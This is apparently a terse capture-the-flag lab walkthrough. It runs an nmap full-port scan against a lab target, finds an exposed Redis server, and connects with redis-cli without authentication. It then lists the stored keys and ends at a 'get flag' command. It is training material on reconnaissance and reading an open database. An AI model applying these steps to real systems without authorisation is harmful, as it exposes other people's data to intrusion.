`nmap -p- {target_ip}`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-10 00:02 EDT
Nmap scan report for 10.129.156.42
Host is up (0.046s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
```

`redis-cli -h {target_ip}`

```
10.129.156.42:6379> info
# Server
redis_version:5.0.7
```

```
10.129.156.42:6379> help select

  SELECT index
  summary: Change the selected database for the current connection
  since: 1.0.0
  group: connection
```

```
10.129.156.42:6379> select 0
...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

```
10.129.156.42:6379> keys *
1) "flag"
2) "numb"
3) "temp"
4) "stor"
```

`10.129.156.42:6379> get flag`

